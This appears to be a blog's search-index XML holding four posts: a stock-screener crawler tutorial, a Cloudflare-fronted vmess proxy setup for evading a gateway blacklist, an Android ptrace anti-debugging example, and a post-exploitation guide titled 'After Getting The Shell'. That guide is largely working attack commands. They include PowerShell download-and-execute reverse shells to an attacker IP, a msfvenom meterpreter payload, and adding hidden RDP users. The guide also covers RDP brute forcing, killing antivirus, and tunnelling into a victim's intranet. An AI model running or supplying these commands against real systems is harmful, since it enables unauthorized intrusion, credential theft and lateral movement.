<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>A Quantitative Trading Model with Stock Screener</title>
    <url>/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/</url>
    <content><![CDATA[<h2 id="Select-the-key-elements-to-make-decision"><a href="#Select-the-key-elements-to-make-decision" class="headerlink" title="Select the key elements to make decision"></a>Select the key elements to make decision</h2><p>Here I choose 5 elements including roe, gross profit margin, liabilities, net profit cash flow, payout ratio to analyze stocks. The reason is not within the scope of this post. Finding out all of these data by hand will be a huge work and will be time-consuming. There exists some better ways to speed up this process. Of course, this is the purpose of my writing this post.<br>The stocks we will analyze mainly sold in many different stock markets, such as Shanghai Stock Exchange, Shenzhen Stock Exchange, Hong Kong Exchange, NASDAQ, New York Stock Exchange, American Stock Exchange, etc. We should filter the qualified stocks judged by the important elements we choose. There are a couple of methods to achieve that. This trading model doesn’t contain complicated calculation and most of the work can be done by stock screener sites and tools like excel.<br>There are tons of stock screeners on the Internet. The first thing is to select a useful one, it depends on yourself. </p>
<img src="/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/pic_1.png" width="60%" height="60%">

<center>https://www.tradingview.com/screener/</center>

<img src="/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/pic_2.png" width="60%" height="60%">

<center>https://finance.yahoo.com/screener/</center>

<img src="/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/pic_3.png" width="60%" height="60%">

<center>https://www.investing.com/stock-screener/</center>

<p>You may need to grab Details of some information from many different sites. For instance, the dividend payout ratio can be found at <a href="https://finbox.com/">https://finbox.com/</a>, and you even need to pay for the data at other sites. For Apple:</p>
<img src="/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/pic_4.png" width="60%" height="60%">

<center>https://finbox.com/AAPL/explorer/payout_ratio</center>

<img src="/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/pic_5.png" width="60%" height="60%">

<img src="/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/pic_6.png" width="60%" height="60%">

<center>https://finance.yahoo.com/quote/AAPL/key-statistics/</center>

<p>Maybe some sites can be crawled by simple spiders. But most of the requests sent by the spiders will be banned by those sites. Of course, if we add some additional measures we can bypass those tricks. To deal with the interception of high-frequency requests, the easiest way is to set a time delay. Besides, you can even modify the header to pretend the real requests generated by the browsers. For JavaScript encrypted contents, you can read the code and find out your bypass ways. That will be a little bit troublesome. There are other tools like selenium, phantomjs, puppeteer to handle it. And Puppeteer will be a good choice in most situations, it also provides a python module named pyppeteer.</p>
<h2 id="Be-careful-with-pyppeteer"><a href="#Be-careful-with-pyppeteer" class="headerlink" title="Be careful with pyppeteer"></a>Be careful with pyppeteer</h2><p>The current version of pyppeteer is not stable, it comes from the limitation of python, some asynchronous methods cannot be used in pyppeteer. And I spent considerable time on those confusing problems. For the exception thrown by pyppeteer:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pyppeteer.errors.NetworkError: Protocol Error (Runtime.callFunctionOn): Session closed. Most likely the page has been closed.</span><br></pre></td></tr></table></figure>
<p>The proposal offered in <a href="https://github.com/miyakogi/pyppeteer/pull/160/files">https://github.com/miyakogi/pyppeteer/pull/160/files</a> might be useful, but it doesn’t merge to the latest version, you need to modify the pyppeteer source code by yourself.<br>Sometimes the browser will crash because of small memory space, especially in a container like Docker or something like CI environment. What you want to do is to launch the browser with some arguments like this:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser = <span class="keyword">await</span> launch(&#123;<span class="string">&#x27;args&#x27;</span>: [<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<p>The toughest problem I have encountered during the programming is the browser will always be stuck at <em>page.goto</em> step, finally the browser will be closed automatically. I guess the program might have triggered some scripts that will keep running and never come to an end to deal with the headless browsers. This is a big problem and I’m struggling on it from days to days. In the JavaScript version, puppeteer provides a couple of ways to stop the page loading and return all of the content. But I found a good way to implement the same function in the end, to use finally expression. </p>
<p>Take a look at the source code of <em>page.goto</em>, this method will raise an exception when it reaches the timeout limit.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_createTimeoutPromise</span>(<span class="params">self</span>) -&gt; Awaitable[<span class="literal">None</span>]:</span><br><span class="line">    self._maximumTimer = self._loop.create_future()</span><br><span class="line">    <span class="keyword">if</span> self._timeout:</span><br><span class="line">        errorMessage = <span class="string">f&#x27;Navigation Timeout Exceeded: <span class="subst">&#123;self._timeout&#125;</span> ms exceeded.&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_timeout_func</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(self._timeout / <span class="number">1000</span>)</span><br><span class="line">            self._maximumTimer.set_exception(TimeoutError(errorMessage))</span><br><span class="line"></span><br><span class="line">        self._timeout_timer: <span class="type">Union</span>[asyncio.Task, asyncio.Future] = self._loop.create_task(_timeout_func())</span><br></pre></td></tr></table></figure>
<p>Our goal is to handle this exception and stop it from shutting down the program. It can be solved in such an easy way, so funny.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser = <span class="keyword">await</span> launch()</span><br><span class="line">page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">await</span> page.goto(url, timeout=<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>The key to the problem is to stop the browser from closing. It may be not so convenient, but it’s robust enough to guarantee the necessary content can be completely fetched without shutting down.</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>The source code can be found at <a href="https://github.com/recursively/quantitative_trading_pub">https://github.com/recursively/quantitative_trading_pub</a>. If you select the American stock market, the final output will be like this:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">德州仪器 TXN</span><br><span class="line">ROE: [57.73 35.39 35.21 29.37 26.62]</span><br><span class="line">cashflow_profit：[1.44 1.47 1.28 1.46 1.29]</span><br><span class="line">gross_profit：[65.11 64.26 61.63 58.15 56.93]</span><br><span class="line">debt_ratio：[47.52 41.41 36.26 38.72 40.19]</span><br><span class="line">bonus_ratio：[0.45860215 0.57088539 0.4581363  0.48392498 0.47075505]</span><br><span class="line"></span><br><span class="line">迪士尼 DIS</span><br><span class="line">ROE: [27.97 21.23 21.39 18.73 16.6 ]</span><br><span class="line">cashflow_profit：[1.3  1.36 1.4  1.37 1.13]</span><br><span class="line">gross_profit：[44.94 45.04 46.09 45.94 45.88]</span><br><span class="line">debt_ratio：[45.28 51.82 48.58 44.82 42.74]</span><br><span class="line">bonus_ratio：[0.20400064 0.28028953 0.26067511 0.26604629 0.25996534]</span><br><span class="line"></span><br><span class="line">赛灵思 XLNX</span><br><span class="line">ROE: [21.18 24.42 21.18 24.17 22.06]</span><br><span class="line">cashflow_profit：[1.28 1.25 1.35 1.5  1.6 ]</span><br><span class="line">gross_profit：[70.21 69.85 69.65 70.18 68.8 ]</span><br><span class="line">debt_ratio：[53.36 47.07 45.99 46.19 44.66]</span><br><span class="line">bonus_ratio：[0.70898438 0.55216693 0.59891107 0.48765432 0.47460317]</span><br></pre></td></tr></table></figure>
<p>The program will calculate the appropriate price, the result below is from HKEX.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IGG 00799       Stock code: HK.00799 Last price:     5.75 gprice:     9.81</span><br></pre></td></tr></table></figure>

<h2 id="More-to-mention"><a href="#More-to-mention" class="headerlink" title="More to mention"></a>More to mention</h2><p>Some implement in the source code needs to be modified to improve the performance. There are too many IO operations in the program, some functions can be replaced by the asynchronous method. Such as the <em>extract_bonus</em> function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_bonus</span>(<span class="params">self, stock_code</span>):</span><br><span class="line">        res = requests.get(self.bonus_url.<span class="built_in">format</span>(stock_code), headers=config.headers)</span><br><span class="line">        root = etree.HTML(res.content)</span><br><span class="line">        years = root.xpath(<span class="string">&#x27;//*[@id=&quot;bonus_table&quot;]/tbody/tr[*]/td[1]/text()&#x27;</span>)</span><br><span class="line">        index = []</span><br><span class="line">        recent_ratio = []</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(years):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;年报&quot;</span> <span class="keyword">in</span> val:</span><br><span class="line">                index.append(idx)</span><br><span class="line"></span><br><span class="line">        ratio = root.xpath(<span class="string">&#x27;//*[@id=&quot;bonus_table&quot;]/tbody/tr[*]/td[9]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(index):</span><br><span class="line">            <span class="keyword">if</span> idx &lt; <span class="number">5</span>:</span><br><span class="line">                recent_ratio.append(ratio[val])</span><br></pre></td></tr></table></figure>
<p>Moreover, the browser just requests a single page for every launch. It wastes too much time during the whole procedure. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">extract_debts</span>(<span class="params">self, stock_code</span>):</span><br><span class="line">        browser = <span class="keyword">await</span> launch(&#123;<span class="string">&#x27;headless&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;args&#x27;</span>: [<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>]&#125;)</span><br><span class="line">        page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> page.goto(self.debt_url.<span class="built_in">format</span>(stock_code), &#123;<span class="string">&#x27;waitUntil&#x27;</span>: <span class="string">&quot;networkidle2&quot;</span>&#125;, timeout=<span class="number">60000</span>)</span><br><span class="line">        <span class="keyword">await</span> page.waitForSelector(<span class="string">&#x27;#cwzbTable&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">&#x27;#cwzbTable &gt; div.scroll_container &gt; ul &gt; li:nth-child(2) &gt; a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        all_targets = <span class="keyword">await</span> page.xpath(<span class="string">&#x27;//*[@id=&quot;cwzbTable&quot;]/div[1]/div[1]/div[4]/table[2]/tbody/tr[11]/td[position()&lt;6]&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> all_targets:</span><br><span class="line">            self.debt_ratio.append(<span class="keyword">await</span> (<span class="keyword">await</span> item.getProperty(<span class="string">&#x27;textContent&#x27;</span>)).jsonValue())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> browser.close()</span><br></pre></td></tr></table></figure>
<p>It can be replaced by requesting every page from a new tab instead of restarting the browser.</p>
]]></content>
      <categories>
        <category>Trading</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Crawler</tag>
        <tag>Quantitative trading</tag>
      </tags>
  </entry>
  <entry>
    <title>Accelerate Services Blacklisted by Gateway through CDN</title>
    <url>/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/</url>
    <content><![CDATA[<h2 id="Packet-Flow"><a href="#Packet-Flow" class="headerlink" title="Packet Flow"></a>Packet Flow</h2><p>The prerequisite for using CDN to bypass the gateway blacklist is that the gateway will never block the traffic from CDN. According to the different CDN providers, there are basically three packet flows:</p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_1.png" width="100%" height="100%">

<p>This is the optimal status that both inside and outside of the gateway have CDN nodes, which can make sure the IP address of the server will not be detected by the gateway.</p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_2.png" width="100%" height="100%">

<p>It will be still OK if the CDN provider doesn’t have any CDN node inside the gateway, all the requests to server will be handled by CDN and the real IP address won’t be exposed.</p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_3.png" width="100%" height="100%">

<p>It’s impossible to bypass the gateway if the CDN provider doesn’t have any node outside the gateway, the real IP address will be exposed on the Internet before the packet goes outside the gateway.</p>
<h2 id="Set-Up-Your-Domain-Name-and-Cloudflare-CDN"><a href="#Set-Up-Your-Domain-Name-and-Cloudflare-CDN" class="headerlink" title="Set Up Your Domain Name and Cloudflare CDN"></a>Set Up Your Domain Name and Cloudflare CDN</h2><p>A domain name is necessary if you want to use any CDN services. By the way, anyone can get a free domain name from <a href="https://www.freenom.com/">Freenom</a>.</p>
<p>If you already have a domain name, make sure you have changed the name server from the original server to the Cloudflare name server.</p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_4.png" width="100%" height="100%">

<p>Next, you need to register a Cloudflare account and add your domain name.</p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_5.png" width="60%" height="60%">

<p>Now we have come to the crucial step, configure your DNS records. Modify your root domain or any subdomains you like to point to the IP address of your server in the A record field.</p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_6.png" width="100%" height="100%">

<p>Remember to enable the proxy and make sure the icon is orange, it’s disabled if the color is grey.</p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_7.png" width="60%" height="60%">


<h2 id="Modify-The-Protocol-Configuration"><a href="#Modify-The-Protocol-Configuration" class="headerlink" title="Modify The Protocol Configuration"></a>Modify The Protocol Configuration</h2><p>This is an important part of whether your service can run normally. There’s something we must be aware of is that the CDN protocol of Cloudflare only supports packet which has a Host header in the web requests, such as HTTP and Websocket. Non-web protocols like FTP and SSH don’t include a HOST header, Cloudflare will not know how to route those packets. Besides, Cloudflare only supports some common ports like 80 and 443, for the other ports, you could check the official website to make sure they are available.</p>
<p>For the vmess protocol, it can be simply disguised as HTTP or Websocket.</p>
<p>For the server-side configuration, modify the <em>inbounds</em> field:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vmess&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">80</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;streamSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;network&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ws&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;wsSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>For the client-side configuration, change the address to your domain name, and switch the network to Websocket(ws), don’t forget to fill in the <em>path</em> field.</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">type:</span> <span class="string">vmess</span></span><br><span class="line"><span class="attr">server:</span> <span class="string">your</span> <span class="string">domain</span> <span class="string">name</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">uuid:</span> </span><br><span class="line"><span class="attr">alterId:</span> <span class="number">64</span></span><br><span class="line"><span class="attr">cipher:</span> <span class="string">auto</span></span><br><span class="line"><span class="comment"># udp: true</span></span><br><span class="line"><span class="comment"># tls: true</span></span><br><span class="line"><span class="comment"># skip-cert-verify: true</span></span><br><span class="line"><span class="attr">network:</span> <span class="string">ws</span></span><br><span class="line"><span class="attr">ws-path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>

<h2 id="Pros-and-Cons"><a href="#Pros-and-Cons" class="headerlink" title="Pros and Cons"></a>Pros and Cons</h2><p>The advantage is obvious. What can be confirmed is that the CDN is rarely banned because of so many services running on it. Any filtering operation by the gateway will cause a bunch of services not accessible unintentionally. The robustness of CDN can be guaranteed. Even if your server IP has been banned by the gateway, your services running on your server are still accessible.</p>
<p>The disadvantage cannot be ignored. The network latency will be high, in fact, sometimes the connection speed is really slow. </p>
<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_8.png" width="60%" height="60%">

<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_9.png" width="60%" height="60%">

<img src="/2021/01/13/Accelerate-Services-Blacklisted-by-Gateway-through-CDN/pic_10.png" width="60%" height="60%">

<p>It’s not suggested to apply this proposal for some services that require high performance and low latency.</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>CDN</tag>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>After Getting The Shell</title>
    <url>/2018/11/02/After-Getting-The-Shell/</url>
    <content><![CDATA[<p>Here gives two methods to trigger a windows reverse shell with PowerShell, remember to bypass the PowerShell security policy before you execute PowerShell command. (<a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a>)</p>
<p>For attacker:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure>

<p>For target:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);</span><br><span class="line">powercat -c x.x.x.x -p 6666 -e cmd</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -port 6666</span><br></pre></td></tr></table></figure>

<p>Sometimes the protection system on the server will block PowerShell from downloading anything, there are two tools to help you:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f &quot;https://download.sysinternals.com/files/PSTools.zip&quot; pstools.zip</span><br></pre></td></tr></table></figure>

<p>Most of the time you will face three situations:</p>
<h3 id="You-don’t-have-administrator-privilege-but-there-is-no-protection-system"><a href="#You-don’t-have-administrator-privilege-but-there-is-no-protection-system" class="headerlink" title="You don’t have administrator privilege, but there is no protection system."></a>You don’t have administrator privilege, but there is no protection system.</h3><p>If you’re lucky enough, there’s no anti-virus software in the system, you can trigger a reverse Metasploit shell in any method you like:<br>In an easy way:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; a.exe</span><br></pre></td></tr></table></figure>
<p>All you need to do is uploading the payload and execute it. When it comes to the question of how to upload the payload, the answer is that you must forward your local port to the public network with the help of FRP(<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a>) which is a powerful tool, and you must have a VPS to achieve that. Even if you don’t have a VPS, you can use ngrok to make it work.</p>
<h3 id="There-is-protection-system-in-the-server-but-you-have-administrator-privilege"><a href="#There-is-protection-system-in-the-server-but-you-have-administrator-privilege" class="headerlink" title="There is protection system in the server, but you have administrator privilege."></a>There is protection system in the server, but you have administrator privilege.</h3><p>If you’re not so lucky, maybe you should find some methods such as veil-evasion to obfuscate your payload. In worse situation, your payload which has been obfuscated was deleted by the antivirus as well. you’d better consider killing the process of the antivirus.</p>
<p>Sometimes it’s not easy to kill the process of antivirus, you can just log into the system by the remote desktop protocol. The first step is to add a new user to the system:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user Name Pass /add</span><br></pre></td></tr></table></figure>
<p>Then you should add this user to the allowed rdp accounts from the commandline:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; domain\user /add</span><br></pre></td></tr></table></figure>

<p>If you want to add a non-domain user, it’s easier:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; user /add</span><br></pre></td></tr></table></figure>
<p>But you cannot do crazy things with this account, but you can identify which protection system the server use and shutdown it or bypass it. It’s not done yet if you want to execute some high-privilege command, privilege escalation could be taken into consideration.</p>
<p>Hydra is a powerful tool if you have a powerful wordlist:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra x.x.x.x rdp -L users.txt -P wordlist.txt -v</span><br></pre></td></tr></table></figure>
<p>Mimikatz is also a good choice to dump the username and password from memory of the server. But most of the time mimikatz will be killed by the protection system.</p>
<h3 id="You-don’t-have-the-administrator-privilege-and-the-server-has-a-protection-system"><a href="#You-don’t-have-the-administrator-privilege-and-the-server-has-a-protection-system" class="headerlink" title="You don’t have the administrator privilege, and the server has a protection system."></a>You don’t have the administrator privilege, and the server has a protection system.</h3><p>Shutdown your computer and go to sleep unless you have some 0day vulnerabilities.</p>
<hr>
<p>There are some ways to help you to go deep and you can treat your victim as a pivot to find out more vulnerable hosts within the intranet.</p>
<p>Firstly try to add the routing rules of the target to your meterpreter shell. An msf built-in module “autoroute” and is convenient. (<a href="https://www.offensive-security.com/metasploit-unleashed/proxytunnels/">https://www.offensive-security.com/metasploit-unleashed/proxytunnels/</a>)</p>
<img src="/2018/11/02/After-Getting-The-Shell/pic_1.png" width="100%" height="100%">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
<img src="/2018/11/02/After-Getting-The-Shell/pic_2.png" width="100%" height="100%">

<p>You can enumerate hosts by performing an ARP scan:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner rhosts=192.168.5.1/24</span><br></pre></td></tr></table></figure>
<img src="/2018/11/02/After-Getting-The-Shell/pic_3.png" width="100%" height="100%">

<p>Adding routing rule is not always working well, you can try the socks4a module in meterpreter:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use anxiliary/server/socks4a</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<img src="/2018/11/02/After-Getting-The-Shell/pic_4.png" width="100%" height="100%">

<p>If it’s Linux in your local machine, you can use proxychains to set the socks5 proxy.<br>Getting proxychains installed:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install proxychains-ng </span><br></pre></td></tr></table></figure>
<p>Add the following content into the /etc/proxychains.conf file:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
<p>Then you can use socks proxy to scan the victim’s intranet:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn --open 192.168.5.0/24</span><br></pre></td></tr></table></figure>
<p>I have tried so many times to find out all the machines in the victim’s intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet.</p>
<p>Or you can use EarthWorm(<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>) to forward the victim machine’s port to your VPS and use proxy<br>chains or proxifier in your local machine:<br>For your VPS:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 1024</span><br></pre></td></tr></table></figure>
<p>The command above means your VPS listens the port 1080, 1024  and waits for attacker connect to the port 1080, the victi<br>m connects to the port 1024.</p>
<p>For target:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ew.exe -s rssocks -d x.x.x.x -e 1024</span><br></pre></td></tr></table></figure>
<p>The argument -d is the IP address of your VPS.</p>
<p>Add the following content into the /etc/proxychains.conf file:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socks5 x.x.x.x 1080</span><br></pre></td></tr></table></figure>
<p>Use proxychains to scan rest of the hosts:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -open 192.168.5.0/24</span><br></pre></td></tr></table></figure>
<p>Here comes the point, most of the antivirus will treat EarthWorm as the threat to the system and it will possibly be killed.</p>
<p>I’d like to recommend another open-source tool called ssocks.(<a href="https://github.com/tostercx/ssocks">https://github.com/tostercx/ssocks</a>) You can build the source code by yourself.</p>
<p>The usage is similar to EarthWorm:</p>
<p>For your VPS:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rcsocks -l 1088 -p 1080 -vv</span><br></pre></td></tr></table></figure>
<p>For target:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./rssocks -s x.x.x.x:1080 -vv</span><br></pre></td></tr></table></figure>
<p>The configuration and operation of proxychains is same as previous description.</p>
<p>If you need ports forwarding, it’s also available in meterpreter: (<a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r 192.168.5.100</span><br></pre></td></tr></table></figure>
<p>Another popular tool is lcx.exe:<br>For attacker:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lcx -listen 2222 3333</span><br></pre></td></tr></table></figure>
<p>For target:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lcx -slave x.x.x.x 2222 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
<p>The IP x.x.x.x is the address of your public VPS. Finally execute <strong><em>mstsc x.x.x.x:3333</em></strong> to connect to the remote desktop of the target.</p>
<p>There are many other useful tools except for the tools I mentioned above, such as netcat, ncat and ssf. You can make a choice among them as you like.</p>
]]></content>
      <categories>
        <category>Hacking</category>
      </categories>
      <tags>
        <tag>PowerShell</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Anti-debugging Tricks - Part 1</title>
    <url>/2021/04/25/Android-Anti-debugging-Tricks-Part-1/</url>
    <content><![CDATA[<h2 id="Ptrace-Anti-debugging"><a href="#Ptrace-Anti-debugging" class="headerlink" title="Ptrace Anti-debugging"></a>Ptrace Anti-debugging</h2><p>The debuggers like gdb utilize the ptrace() function to attach to a process at runtime. Since only one process is allowed to do this at a time, having a call to ptrace() in your code can be used as an anti-debugging technique.</p>
<p>For the code example:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span> <span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Number: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t trace me!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f (i++);</span><br><span class="line">        sleep (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we execute the program we can get the normal output every second, but if we debug it with <em>strace</em> the process will exit abnormally.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">strace ./a.out</span></span><br><span class="line">...</span><br><span class="line">mprotect(0xb6fb4000, 4096, PROT_READ)   = 0</span><br><span class="line">munmap(0xb6f57000, 94267)               = 0</span><br><span class="line">ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)</span><br><span class="line">fstat64(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...&#125;) = 0</span><br><span class="line">brk(NULL)                               = 0x82c000</span><br><span class="line">brk(0x84d000)                           = 0x84d000</span><br><span class="line">write(1, &quot;Don&#x27;t trace me!\n&quot;, 16Don&#x27;t trace me!</span><br><span class="line">)       = 16</span><br><span class="line">exit_group(1)                           = ?</span><br><span class="line">+++ exited with 1 +++</span><br></pre></td></tr></table></figure>
<p>To bypass it, we can patch the ptrace part with NOP. And also, this anti-debugging method can be bypassed by using the <em>LD_PRELOAD</em> environment variable, which allows us to control the loading path of a shared library.</p>
